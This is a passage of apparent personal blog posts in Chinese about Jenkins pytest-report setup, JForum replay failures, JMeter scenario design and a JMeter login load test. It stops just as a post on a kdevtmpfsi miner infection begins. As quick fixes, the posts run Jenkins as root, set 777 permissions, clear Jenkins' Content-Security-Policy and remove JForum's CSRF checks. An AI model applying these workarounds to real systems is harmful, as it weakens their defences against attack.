
<ul>
<li>如何知道自己的路径？用下面的命令就能查到</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@VM-24-13-centos jenkins]# systemctl status jenkins</span><br><span class="line">● jenkins.service - Jenkins Continuous Integration Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/jenkins.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since 二 2022-03-29 15:25:17 CST; 10min ago</span><br><span class="line"> Main PID: 23668 (java)</span><br><span class="line">    Tasks: 37</span><br><span class="line">   Memory: 269.3M</span><br><span class="line">   CGroup: /system.slice/jenkins.service</span><br><span class="line">           └─23668 /usr/bin/java -Djava.awt.headless=true -jar /usr/share/java/jenkins.war --webroot=%C/jenkins/war --httpPort=544..</span><br></pre></td></tr></table></figure>

<ul>
<li>用浏览器打开访问地址</li>
</ul>
<p><img src="/aposts/6ef225f8/image-20220329153925727.png" alt="image-20220329153925727"></p>
<ul>
<li><p>页面会出现类似于<code>Please wait while Jenkins is getting ready to work ...</code>，等待一会儿后，就自动会打开如上面的输入密码的界面，</p>
<ul>
<li><strong>这里我没有实践</strong>。有的博客说一直停留在无法please wait界面，可以要修改配置文件需要进入<code>/var/lib/jenkins/</code>目录（通过rpm方式安装的jenkins是这个目录）下<code>hudson.model.UpdateCenter.xml</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将&lt;url&gt;https://updates.jenkins.io/update-center.json&lt;/url&gt;</span><br><span class="line">换成</span><br><span class="line">&lt;url&gt;http://mirror.xmission.com/jenkins/updates/update-center.json&lt;/url&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>检查jenkins配置配置文件，将执行用户改成<code>root</code>,不然后面可能出现执行shell没有权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/jenkins # 编辑文件</span><br><span class="line">JENKINS_USER=&quot;root&quot; # 改成root</span><br><span class="line"></span><br><span class="line">service jenkins restart</span><br></pre></td></tr></table></figure>
</li>
<li><p>找到密码文件后，拷贝输入到浏览器中登录成功</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /var/lib/jenkins/secrets/initialAdminPassword # 得到密码</span><br></pre></td></tr></table></figure>

<ul>
<li>先默认不选择插件</li>
</ul>
<p><img src="/aposts/6ef225f8/image-20220329155214241.png" alt="image-20220329155214241"></p>
<p><img src="/aposts/6ef225f8/image-20220329155307321.png" alt="image-20220329155307321"></p>
<ul>
<li><p>把测试代码上传到服务器，也可以采用使用Jenkins拉取git的方式，中途测试中<code>jenkins</code>出现无权限问题，可以修改目录权限：<code>chmod -R 777 auto_web_ui/</code></p>
</li>
<li><p><code>HTML Publisher</code> 插件可以展示html报告，<code>jenkins</code>本次不安装，用自带的<code>Achive the artifacts</code></p>
</li>
<li><p>然后新建一个<code>job</code>，执行shell里面配置生成<code>pytest</code>命令，运行完成后在当前目录下生成一个<code>report.html</code>报告，第一行的<code>#!/bin/bash</code>和最后一行的<code>echo 0</code> 是为了解决构建失败的问题</p>
</li>
</ul>
<p><img src="/aposts/6ef225f8/image-20220330100642967.png" alt="image-20220330100642967"></p>
<ul>
<li>构建后操作，使用<code>Achive the artifacts</code>即可，测试报告的路径记得要对应</li>
</ul>
<p><img src="/aposts/6ef225f8/image-20220330100856448.png" alt="image-20220330100856448"></p>
<h3 id="构建运行"><a href="#构建运行" class="headerlink" title="构建运行"></a>构建运行</h3><p><img src="/aposts/6ef225f8/image-20220330101017680.png" alt="image-20220330101017680"></p>
<p>查看html报告，样式丢失了</p>
<p><img src="/aposts/6ef225f8/image-20220329180732531.png" alt="image-20220329180732531"></p>
<ul>
<li>在jenkins-&gt;系统管理-&gt;脚本命令行，输入以下命令执行就可以了</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.setProperty(&quot;hudson.model.DirectoryBrowserSupport.CSP&quot;,&quot;&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/6ef225f8/image-20220329180858248.png" alt="image-20220329180858248"></p>
<ul>
<li>打开html界面后，刷新</li>
</ul>
<p><img src="/aposts/6ef225f8/image-20220330101618078.png" alt="image-20220330101618078"></p>
<ul>
<li><p>但是这样重启后会失效，永久解决方案是安装插件：<code>Startup Trigger</code> 和 <code>Groovy</code> 插件</p>
</li>
<li><p>在Job配置页面， 在构建触发器的时候勾选：<code>Build when job nodes start</code></p>
</li>
</ul>
<p><img src="/aposts/6ef225f8/image-20220330102008961.png" alt="image-20220330102008961"></p>
<ul>
<li>在Job配置页面，增加构建步骤<code>Execute system Groovy script</code>，脚本输入：<code>System.setProperty(&quot;hudson.model.DirectoryBrowserSupport.CSP&quot;,&quot;&quot;)</code></li>
</ul>
<p><img src="/aposts/6ef225f8/image-20220330102150623.png" alt="image-20220330102150623"></p>
]]></content>
      <categories>
        <category>Jenkins</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>自动化测试</tag>
        <tag>Jenkins</tag>
        <tag>selenium</tag>
      </tags>
  </entry>
  <entry>
    <title>jforum录制后无法发帖</title>
    <url>/aposts/aec8b9a7/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li><p>环境介绍</p>
<ul>
<li>jmeter 5.4</li>
<li>jforum 2.7</li>
<li>badboy 2.2</li>
</ul>
</li>
<li><p>badboy录制了jforum：登录，打开主题，发布帖子</p>
</li>
<li><p>回放过程中，发现无法发帖成功，按照书籍中把发帖请求，设置为跟随重定向，发现依然无法发帖成功</p>
<p><img src="/aposts/aec8b9a7/image-20211021170752994.png" alt="image-20211021170752994"></p>
</li>
</ul>
<h2 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h2><ul>
<li>采用fiddler抓包发帖请求，发现出现了一个<code>OWASP_CSRFTOKEN</code>参数，和录制过来的参数不一致，是一个可变参数，并且尝试输入此参数用fiddler发包，也会造成发帖失败</li>
<li>搜索到相应关键字，发现有人遇到同样问题，只要去掉tomcat下面的<code>apache-tomcat-XX\webapps\jforum-2.5.0\WEB-INF\web.xml</code>，所有关于csrf的验证去掉，然后再服务器上重启tomcat，就能正常发帖成功</li>
</ul>
]]></content>
      <categories>
        <category>jmeter</category>
      </categories>
      <tags>
        <tag>jmeter</tag>
        <tag>性能测试</tag>
      </tags>
  </entry>
  <entry>
    <title>jmeter场景设计</title>
    <url>/aposts/42060b4c/</url>
    <content><![CDATA[<h2 id="场景设计"><a href="#场景设计" class="headerlink" title="场景设计"></a>场景设计</h2><ul>
<li>在建立测试模型时已经确定了测试的业务种类，场景设计是组织虚拟用户、组合业务种类到一个测试单元，根据测试模型与测试目标，整理出如表 11-11 所示测试场景。</li>
<li>并发数的计算来源于<a href="https://moon-full.gitee.io/2021/10/19/%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E5%92%8C%E7%9B%AE%E6%A0%87%E7%A1%AE%E5%AE%9A/">这里</a></li>
</ul>
<p><img src="/aposts/42060b4c/image-20211026103114157.png" alt="image-20211026103114157"></p>
<p><img src="/aposts/42060b4c/image-20211026103138117.png" alt="image-20211026103138117"></p>
<h3 id="Sec-101-基准测试"><a href="#Sec-101-基准测试" class="headerlink" title="Sec_101 基准测试:"></a>Sec_101 基准测试:</h3><ul>
<li>主要用来验证测试环境、验证脚本正确性、得到系统的性能基准，为后续的测试执行提供参考。基准测试采用单业务场景、单用户的方式来执行脚本;执行时长视响应时间调整，测试结果采样样本尽量大(比如响应时间1秒，1000 个事务就需要运行 1000 秒以上;响应时间 200 毫秒，运行 600 秒就可以完成 3000 个事务的采样，600*1000&#x2F;200&#x3D;3000)。</li>
</ul>
<h3 id="Sec-102-配置测试"><a href="#Sec-102-配置测试" class="headerlink" title="Sec 102 配置测试:"></a>Sec 102 配置测试:</h3><ul>
<li>帮助分析系统相关性能配置，确保系统配置适合于当前性能需求，一般场景为混合场景(多个业务同时执行)。测试过程是一个实验过程，先是找出不合理配置，然后进行修改，最后进行验证;周而复始只到配置满足要求。</li>
</ul>
<h3 id="Sec-103-负载测试场景"><a href="#Sec-103-负载测试场景" class="headerlink" title="Sec 103 负载测试场景:"></a>Sec 103 负载测试场景:</h3><ul>
<li>负载测试的目的是帮助我们找出性能问题与风险，对系统进行定容定量，分析系统性能变化趋势;为系统优化、性能调整提供数据支撑。</li>
<li>负载测试在执行时又分为单场景与混合场景;单场景有利于分析性能问题，因为排除了其他业务的干扰;混合场景更贴近于用户实际使用习惯，是一个综合的性能评估。建议读者先做单场景的性能执行工作，后做混合场景的执行工作。可以看到表 11-11 中的负载场景有多个不同负载量。</li>
</ul>
<p><img src="/aposts/42060b4c/image-20211026104416276.png" alt="image-20211026104416276"></p>
<ul>
<li>曲线是常见的性能变化趋势图，1这个点，通常就是我们估算的满足性能需求的点</li>
<li>2这个点达到系统最大吞吐量，通常是系统拐点(之后性能变差)</li>
<li>3这个点是系统已经过载吞吐量已经开始减小;负载测试原则上需要找出这3个点。在负载测试执行时找出这3个点还是比较麻烦的，常常会因为一些配置、程序问题而受到干扰;通常找出这3个点需要很多次的执行，所以测试执行也是一个耗时的工作。</li>
</ul>
<h3 id="Sec-104-稳定性测"><a href="#Sec-104-稳定性测" class="headerlink" title="Sec 104 稳定性测"></a>Sec 104 稳定性测</h3><ul>
<li>稳定性测试的目的是验证在当前软硬件环境下，长时间运行一定负载，确定系统在满足性能指标的前提下是否运行稳定，执行时采用混合场景。</li>
<li>按惯例要求执行时间不低于 8 小时，在此我们计划运行 12 小时。稳定性测试原则上是时间越长越好，有些隐藏较深的诸如内存溢出的问题是需要长时间运行才能反映出来的。</li>
<li>注：实例 Jforum 系统场景比较简单，直接把多个业务组织一起即可；实际工作中会遇到一些场景复杂的业务。比如 WMS （仓库管理系统）系统， WMS 中都会有盘点功能，此功能就不应该与日常功能混合在一起，因为盘点通常都是一月一次，所以组织场景时尽量要与实际业务情况一致。</li>
</ul>
<h2 id="场景实现"><a href="#场景实现" class="headerlink" title="场景实现"></a>场景实现</h2><ul>
<li>基准测试很好实现，只要保证脚本能正常跑就可以了</li>
</ul>
<h3 id="配置测试"><a href="#配置测试" class="headerlink" title="配置测试"></a>配置测试</h3><ul>
<li><p>运行多个线程组，实现配置测试</p>
<p><img src="/aposts/42060b4c/image-20211026105457474.png" alt="image-20211026105457474"></p>
</li>
</ul>
<h4 id="用户估算"><a href="#用户估算" class="headerlink" title="用户估算"></a>用户估算</h4><ul>
<li>在实现场景之前先搞清楚业务关联关系(登录&#x2F;浏览帖子&#x2F;发新帖&#x2F;回复帖子的比例为<br>20:40:7:10),发帖与回帖时需要登录,回帖之前会浏览帖子,浏览帖子是可以不用登录的,发帖<br>与回帖的并发数小于登录,所以有部分用户是登录后只浏览帖子。按20:40:7:10的比例来算,回<br>帖用户10个,发新帖用户7个,回贴与发帖都需要登录,这样登录已经有17个用户,还需要3<br>个用户,可以安排3个用户登录后浏览帖子,最后还需要27个浏览帖子的用户。27个用户的来<br>源是40个测览用户减10个回帖用户(回帖前会登录及浏览帖子),再减3个登录后浏览的用户</li>
</ul>
<h4 id="线程组设置"><a href="#线程组设置" class="headerlink" title="线程组设置"></a>线程组设置</h4><h5 id="JMeter线程组之Stepping-Thread-Group插件参数详情"><a href="#JMeter线程组之Stepping-Thread-Group插件参数详情" class="headerlink" title="JMeter线程组之Stepping Thread Group插件参数详情"></a>JMeter线程组之Stepping Thread Group插件参数详情</h5><p><strong>如图11-49所示</strong></p>
<ul>
<li><p>This group will start 30 threads - 设置单台负载机，线程组启动的线程总数为30个</p>
</li>
<li><p>First,wait for n seconds - 启动第一个线程之前，需要等待1秒</p>
</li>
<li><p>Then start 10 threads - 设置最开始启动10个线程</p>
</li>
<li><p>Next,add 10 threads every 600 seconds ,using ramp-up 10 seconds - 每隔600秒(十分钟)，在10秒内启动10个线程</p>
</li>
<li><p>Then hold load for 600 seconds - 单台负载机启动的线程总数达到30个，持续运行600秒</p>
</li>
<li><p>Finally,stop 5 threads every 1 seconds - 最后每隔1秒，停止5个线程数</p>
</li>
</ul>
<h5 id="回帖，发帖，浏览帖子Stepping-Thread-Group设置"><a href="#回帖，发帖，浏览帖子Stepping-Thread-Group设置" class="headerlink" title="回帖，发帖，浏览帖子Stepping Thread Group设置"></a>回帖，发帖，浏览帖子Stepping Thread Group设置</h5><ul>
<li><p>图11-49是回帖线程组设置,负载分3个阶段加载,分别是并发10个、20个、30个线程</p>
<p><img src="/aposts/42060b4c/image-20211026110301084.png" alt="image-20211026110301084"></p>
</li>
<li><p>图11-50是发帖线程组设置,负载分3个阶段加载,分别是并发7个、14个、21个线程</p>
<p><img src="/aposts/42060b4c/image-20211026110321179.png" alt="image-20211026110321179"></p>
</li>
<li><p>图11-51是浏览帖子线程组设置,负载分3个阶段加载,分别是并发27个、54个、81个线程。</p>
<p><img src="/aposts/42060b4c/image-20211026110338721.png" alt="image-20211026110338721"></p>
</li>
</ul>
<h5 id="此方式优势"><a href="#此方式优势" class="headerlink" title="此方式优势:"></a>此方式优势:</h5><ul>
<li>3个线程组互不干扰,独立设置(3个线程组的并发用户之和刚好与只运行一个线程组的<br>场景相等),简单明了,易于维护。</li>
</ul>
<h5 id="此方式劣势"><a href="#此方式劣势" class="headerlink" title="此方式劣势"></a>此方式劣势</h5><ul>
<li>由于3个线程组分开设置,相当于3个不同的脚本,所以参数化都需要分开,而且登录<br>账号同样也不能有冲突,所以可以把用户的参数文件分成3份,每个线程组一份。虽然 JMeter<br>也支持多个线程组共用一份参数文件,但是不能保证每个线程取到的参数唯一性。所以在此<br>还是建议大家分开做参数化。</li>
</ul>
<h3 id="负载场景设计"><a href="#负载场景设计" class="headerlink" title="负载场景设计"></a>负载场景设计</h3><ul>
<li>以只运行一个线程组为例来设置负载场景。图11-52是一个典型的负载场景,分3个阶段运行负载</li>
<li>第一阶段只运行77个并发用户,运行10分钟。</li>
<li>第二阶段再加上77个并发用户共计154个用户,运行10分钟。</li>
<li>第二阶段再加上77个并发用户共计231个用户,运行10分钟。</li>
<li>这种场景帮助我们来进行定容定量的测试,最终测试结果整理呈如图11-53所示。当然,测试执行过程中没有这么巧合,不是测试三个点就可以得到结果曲线,常常是不断的试验,</li>
</ul>
<p><img src="/aposts/42060b4c/image-20211026113216382.png" alt="image-20211026113216382"></p>
<p><strong>本文抄录于《全栈性能测试修炼宝典JMeter实战》</strong></p>
]]></content>
      <categories>
        <category>jmeter</category>
      </categories>
      <tags>
        <tag>jmeter</tag>
        <tag>性能测试</tag>
      </tags>
  </entry>
  <entry>
    <title>jmeter登录并发实例</title>
    <url>/aposts/53ff70d6/</url>
    <content><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
<li>本次用jmeter进行登录并发的压测实例</li>
<li>jmeter version 5.4.1</li>
<li>压测平台是自己搭建的jform</li>
<li>压测机器为单机win</li>
</ul>
<h2 id="20个并发登录"><a href="#20个并发登录" class="headerlink" title="20个并发登录"></a>20个并发登录</h2><h3 id="设置线程组"><a href="#设置线程组" class="headerlink" title="设置线程组"></a>设置线程组</h3><ul>
<li>1秒钟发20个线程</li>
</ul>
<p><img src="/aposts/53ff70d6/image-20211027161520958.png" alt="image-20211027161520958"></p>
<h3 id="参数化登录数据"><a href="#参数化登录数据" class="headerlink" title="参数化登录数据"></a>参数化登录数据</h3><ul>
<li><p>下图为参数化设置，文件名使用相对路径，指向<code>%JMETER_HOME%</code>上一级目录，比如我放到的是<code>D:\exe\apache-jmeter-5.4.1</code></p>
<p><img src="/aposts/53ff70d6/image-20211027161648791.png" alt="image-20211027161648791"></p>
</li>
<li><p>参数化格式为</p>
</li>
</ul>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">test1008,<span class="number">123456</span></span><br><span class="line">test1009,<span class="number">123456</span></span><br><span class="line">test1010,<span class="number">123456</span></span><br><span class="line">test1011,<span class="number">123456</span></span><br><span class="line">test1012,<span class="number">123456</span></span><br><span class="line">test1013,<span class="number">123456</span></span><br></pre></td></tr></table></figure>



<h3 id="登录接口"><a href="#登录接口" class="headerlink" title="登录接口"></a>登录接口</h3><p><img src="/aposts/53ff70d6/image-20211027162309389.png" alt="image-20211027162309389"></p>
<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><ul>
<li><p>运行成功后，查看测试报告</p>
<p><img src="/aposts/53ff70d6/image-20211027162426589.png" alt="image-20211027162426589"></p>
</li>
</ul>
<h3 id="服务器监控"><a href="#服务器监控" class="headerlink" title="服务器监控"></a>服务器监控</h3><ul>
<li><p>下载<a href="https://jmeter-plugins.org/wiki/PerfMonAgent/">ServerAgent-2.2.3</a>，放到服务器上，给其他插件提供性能指标数据</p>
</li>
<li><p>下载<a href="https://jmeter-plugins.org/?search=jpgc-perfmon">jpgc</a>,监控cpu,men等</p>
<p><img src="/aposts/53ff70d6/image-20211027162740355.png" alt="image-20211027162740355"></p>
<ul>
<li>解压后把<code>perfmon-2.2.2.jar</code>放到<code>D:\exe\apache-jmeter-5.4.1\lib\ext</code>目录下面</li>
</ul>
</li>
<li><p>重启jmeter，新增监听器可以看到PerfMon插件</p>
<p><img src="/aposts/53ff70d6/image-20211027163542732.png" alt="image-20211027163542732"></p>
</li>
<li><p>新增监控指标</p>
<ul>
<li><p>CPU：combined ： 综合CPU使用情况</p>
</li>
<li><p>Memory：usedperc：内存使用比例</p>
</li>
<li><p>DIsk IO：usedperc：磁盘IO占用比例</p>
</li>
<li><p>Swap：分区通常被称为交换分区，这块儿分区位于硬盘的某个位置，当系统内存（物理内存）不够用的时候，如果开启了交换分区，部分内存里面暂时不用的数据就会Swap out（换出）到这块儿分区；当系统要使用这部分数据的时候，存储在Swap分区的数据就会Swap in(换入）到内存当中。</p>
<p>简而言之，Swap分区就类似于内存的后备内存(只是做了下缓冲）</p>
</li>
</ul>
</li>
</ul>
<p><img src="/aposts/53ff70d6/image-20211027163910713.png" alt="image-20211027163910713"></p>
<h4 id="设置ServerAgent"><a href="#设置ServerAgent" class="headerlink" title="设置ServerAgent"></a>设置ServerAgent</h4><ul>
<li>把压缩包放在服务器（centos7）上后，解压</li>
</ul>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">[root@racknerd-<span class="number">4</span>dbd89 local]# tar -zxvf ServerAgent-<span class="number">2.2</span>.<span class="number">3</span>.tar.gz</span><br><span class="line">ServerAgent-<span class="number">2.2</span>.<span class="number">3</span>/</span><br><span class="line">ServerAgent-<span class="number">2.2</span>.<span class="number">3</span>/CMDRunner.jar</span><br><span class="line">ServerAgent-<span class="number">2.2</span>.<span class="number">3</span>/lib/</span><br><span class="line">ServerAgent-<span class="number">2.2</span>.<span class="number">3</span>/lib/avalon-framework-<span class="number">4.1</span>.<span class="number">5</span>.jar</span><br><span class="line">ServerAgent-<span class="number">2.2</span>.<span class="number">3</span>/lib/cmdrunner-<span class="number">1.0</span>.<span class="number">2</span>.jar</span><br><span class="line">ServerAgent-<span class="number">2.2</span>.<span class="number">3</span>/lib/jorphan-<span class="number">2.6</span>.jar</span><br><span class="line">ServerAgent-<span class="number">2.2</span>.<span class="number">3</span>/lib/libsigar-amd64-freebsd-<span class="number">6</span>.so</span><br><span class="line">ServerAgent-<span class="number">2.2</span>.<span class="number">3</span>/lib/libsigar-amd64-linux.so</span><br><span class="line">ServerAgent-<span class="number">2.2</span>.<span class="number">3</span>/lib/libsigar-amd64-solaris.so</span><br><span class="line">ServerAgent-<span class="number">2.2</span>.<span class="number">3</span>/lib/libsigar-ia64-hpux-<span class="number">11</span>.sl</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li><p>启动发现4444端口被使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@racknerd-4dbd89 ServerAgent-2.2.3]<span class="comment"># sh startAgent.sh</span></span><br><span class="line">INFO    2021-10-27 04:55:56.640 [kg.apc.p] (): Binding UDP to 4444</span><br><span class="line">INFO    2021-10-27 04:55:57.767 [kg.apc.p] (): Binding TCP to 4444</span><br><span class="line">ERROR   2021-10-27 04:55:57.778 [kg.apc.p] (): Can<span class="string">&#x27;t accept TCP connections</span></span><br><span class="line"><span class="string">java.net.BindException: Address already in use</span></span><br><span class="line"><span class="string">        at sun.nio.ch.Net.bind0(Native Method)</span></span><br><span class="line"><span class="string">        at sun.nio.ch.Net.bind(Net.java:438)</span></span><br><span class="line"><span class="string">        at sun.nio.ch.Net.bind(Net.java:430)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改端口</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@racknerd-4dbd89 ServerAgent-2.2.3]<span class="comment"># java -jar ./CMDRunner.jar --tool PerfMonAgent --udp-port 7777 --tcp-port 7777</span></span><br><span class="line">INFO    2021-10-27 04:57:38.028 [kg.apc.p] (): Binding UDP to 7777</span><br><span class="line">INFO    2021-10-27 04:57:39.040 [kg.apc.p] (): Binding TCP to 7777</span><br><span class="line">INFO    2021-10-27 04:57:39.048 [kg.apc.p] (): JP@GC Agent v2.2.3 started</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>jmeter这里也要修改端口为7777</p>
<p><img src="/aposts/53ff70d6/image-20211027164933790.png" alt="image-20211027164933790"></p>
</li>
</ul>
<h3 id="再次运行"><a href="#再次运行" class="headerlink" title="再次运行"></a>再次运行</h3><ul>
<li><p>发现启动后，监听器jpgc这里一直卡着，jmeter也一直卡死，用任务管理器结束任务后，查了下相关资料，说要设置文件名路径，我设置后依然如此</p>
</li>
<li><p>等待漫长五分钟后，终于看到结果出现timed out提示</p>
<p><img src="/aposts/53ff70d6/image-20211027174053337.png" alt="image-20211027174053337"></p>
</li>
<li><p>想到应该是服务器端口没有开放，设置防火墙端口开放</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=7777/tcp --permanent</span><br><span class="line">firewall-cmd --relod</span><br></pre></td></tr></table></figure>


</li>
<li><p>重启服务器上的serverAgent</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@racknerd-4dbd89 ServerAgent-2.2.3]<span class="comment"># netstat -lnpt |grep 7777</span></span><br><span class="line">tcp6       0      0 :::7777                 :::*                    LISTEN      23648/java</span><br><span class="line">[root@racknerd-4dbd89 ServerAgent-2.2.3]<span class="comment"># kill -9 23648</span></span><br><span class="line">[root@racknerd-4dbd89 ServerAgent-2.2.3]<span class="comment"># java -jar ./CMDRunner.jar --tool PerfMonAgent --udp-port 7777 --tcp-port 7777</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>再次运行jmeter脚本后，查看到服务器这里已经连接上了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gent --udp-port 7777 --tcp-port 7777</span><br><span class="line">INFO    2021-10-27 05:22:24.028 [kg.apc.p] (): Binding UDP to 7777</span><br><span class="line">INFO    2021-10-27 05:22:25.036 [kg.apc.p] (): Binding TCP to 7777</span><br><span class="line">INFO    2021-10-27 05:22:25.070 [kg.apc.p] (): JP@GC Agent v2.2.3 started</span><br><span class="line">INFO    2021-10-27 05:23:06.182 [kg.apc.p] (): Accepting new TCP connection</span><br><span class="line">INFO    2021-10-27 05:23:06.194 [kg.apc.p] (): Yep, we received the <span class="string">&#x27;test&#x27;</span> <span class="built_in">command</span></span><br><span class="line">INFO    2021-10-27 05:23:27.425 [kg.apc.p] (): Starting measures: swap: memory:cpu:</span><br><span class="line">INFO    2021-10-27 05:23:30.179 [kg.apc.p] (): Client disconnected</span><br><span class="line">INFO    2021-10-27 05:26:35.347 [kg.apc.p] (): Accepting new TCP connection</span><br><span class="line">INFO    2021-10-27 05:26:39.514 [kg.apc.p] (): Closing TCP connection</span><br><span class="line">INFO    2021-10-27 05:31:26.064 [kg.apc.p] (): Accepting new TCP connection</span><br><span class="line">INFO    2021-10-27 05:31:26.067 [kg.apc.p] (): Yep, we received the <span class="string">&#x27;test&#x27;</span> <span class="built_in">command</span></span><br><span class="line">INFO    2021-10-27 05:31:26.274 [kg.apc.p] (): Starting measures: swap: memory:cpu:     disks i/o:</span><br><span class="line">INFO    2021-10-27 05:31:28.823 [kg.apc.p] (): Client disconnected</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="出现提示框"><a href="#出现提示框" class="headerlink" title="出现提示框"></a>出现提示框</h4><ul>
<li><p>再次运行是，出现一个弹框</p>
<p><img src="/aposts/53ff70d6/image-20211028103314940.png" alt="image-20211028103314940"></p>
</li>
<li><p>打开<code>jmeter.properties</code>设置<code>resultcollector.action_if_file_exists=DELETE</code>,如下图展示，<code>action_if_file_exists</code>有三个值<code>ask</code>,<code>append</code>,<code>delete</code>看字面意思就很清楚了。</p>
</li>
<li><p>修改后重新打开jmeter，再次运行脚本就不会出现提示</p>
<p><img src="/aposts/53ff70d6/image-20211028103515713.png" alt="image-20211028103515713"></p>
</li>
</ul>
<h4 id="查看测试报告"><a href="#查看测试报告" class="headerlink" title="查看测试报告"></a>查看测试报告</h4><h5 id="查看服务器的测试报告"><a href="#查看服务器的测试报告" class="headerlink" title="查看服务器的测试报告"></a>查看服务器的测试报告</h5><p><img src="/aposts/53ff70d6/image-20211027174638748.png" alt="image-20211027174638748"></p>
<ul>
<li><p>X 10000000表示放大的次数，助于观察</p>
</li>
<li><p>查看cpu情况</p>
<p><img src="/aposts/53ff70d6/image-20211027174848666.png" alt="image-20211027174848666"></p>
</li>
</ul>
<p><img src="/aposts/53ff70d6/image-20211027175002092.png" alt="image-20211027175002092"></p>
<ul>
<li><p>我的服务器是单核cpu，配置比较差，直接就100%</p>
</li>
<li><p>磁盘使用情况还不错</p>
<p><img src="/aposts/53ff70d6/image-20211027175148394.png" alt="image-20211027175148394"></p>
</li>
<li><p>其他情况就不分析了，类似</p>
</li>
</ul>
<h5 id="查看其他监听报告"><a href="#查看其他监听报告" class="headerlink" title="查看其他监听报告"></a>查看其他监听报告</h5><ul>
<li>汇总报告，单位为ms</li>
</ul>
<p><img src="/aposts/53ff70d6/image-20211028105143043.png" alt="image-20211028105143043"></p>
<ul>
<li><p>聚合测试报告，单位为ms，其中<code>Throughput</code>（吞吐量）——默认情况下表示每秒完成的请求数（<code>Request per Second</code>），当使用了<code> Transaction Controller</code> 时，也可以表示类似<code> LoadRunner</code> 的<code> Transaction per Second</code> 数（该值越大越好，表示服务器处理能力越强。）</p>
<p><img src="/aposts/53ff70d6/image-20211028105302902.png" alt="image-20211028105302902"></p>
</li>
</ul>
<h2 id="简单负载登录测试"><a href="#简单负载登录测试" class="headerlink" title="简单负载登录测试"></a>简单负载登录测试</h2><ul>
<li>1秒钟增加2个线程，运行100次</li>
<li>分别看20，40，60并发下的表现</li>
</ul>
<h3 id="并发20的线程组设置"><a href="#并发20的线程组设置" class="headerlink" title="并发20的线程组设置"></a>并发20的线程组设置</h3><p><img src="/aposts/53ff70d6/image-20211028114406461.png" alt="image-20211028114406461"></p>
<h3 id="参数化"><a href="#参数化" class="headerlink" title="参数化"></a>参数化</h3><ul>
<li>沿用上述</li>
</ul>
<h3 id="集合点设置"><a href="#集合点设置" class="headerlink" title="集合点设置"></a>集合点设置</h3><p><img src="/aposts/53ff70d6/image-20211028114550041.png" alt="image-20211028114550041"></p>
<ul>
<li><p>Number of Simulated Users to Group by:每次释放的线程数量。<strong>如果设置为0，等同于设置为线程租中的线程数量</strong>。</p>
</li>
<li><p>Timeout in milliseconds:</p>
<ul>
<li><strong>如果设置为0，Timer将会等待线程数达到了”Number of Simultaneous Users to Group”中设置的值才释放</strong>。</li>
<li>如果大于0，那么如果超过Timeout in milliseconds中设置的最大等待时间(毫秒为单位)后还没达到”Number of Simultaneous Users to Group”中设置的值，Timer将不再等待，释放已到达的线程。默认为0</li>
</ul>
</li>
<li><p>注意：如果设置Timeout in milliseconds为0，且线程数量无法达到”Number of Simultaneous Users to Group by”中设置的值，那么Test将无限等待，除非手动终止。</p>
</li>
<li><p>Synchronizing timer 仅作用于同一个JVM中的线程,所以，如果使用并发测试，确保”Number of Simultaneous Users to Group by”中设置的值不大于它所在线程组包含的用户数。</p>
</li>
<li><p><strong>备注：像聚合报告这类监听器最好少添加，一个线程组用一个足以。之所以建议少添加是因为这类组件非常消耗性能，容易对压测结果产生影响。</strong></p>
</li>
</ul>
<h3 id="查看服务器报告"><a href="#查看服务器报告" class="headerlink" title="查看服务器报告"></a>查看服务器报告</h3><ul>
<li><p>swap波动比较大</p>
<p><img src="/aposts/53ff70d6/image-20211028152612334.png" alt="image-20211028152612334"></p>
</li>
<li><p>cpu再并发请求的时候直接100%</p>
<p><img src="/aposts/53ff70d6/image-20211028152720062.png" alt="image-20211028152720062"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>jmeter</category>
      </categories>
      <tags>
        <tag>jmeter</tag>
        <tag>性能测试</tag>
      </tags>
  </entry>
  <entry>
    <title>kdevtmpfsi--服务器CPU占用高、内存占用高</title>
    <url>/aposts/177838dd/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>这篇<a href="aposts/d4ea272f/">文章</a>，后续的结论说是服务器配置不够观点是错误的，经过排查发现是服务器中毒了，经过<code>top</code>排查到了是有个叫<code>kdevtmpfsi</code>的后台进程太大造成，搜了下相关资料刚好有人和我相同的问题，把解决方案就<a href="https://blog.csdn.net/m0_37282062/article/details/108645671">转载</a>了过来</p>
<h2 id="中毒具体描述"><a href="#中毒具体描述" class="headerlink" title="中毒具体描述"></a>中毒具体描述</h2><ul>
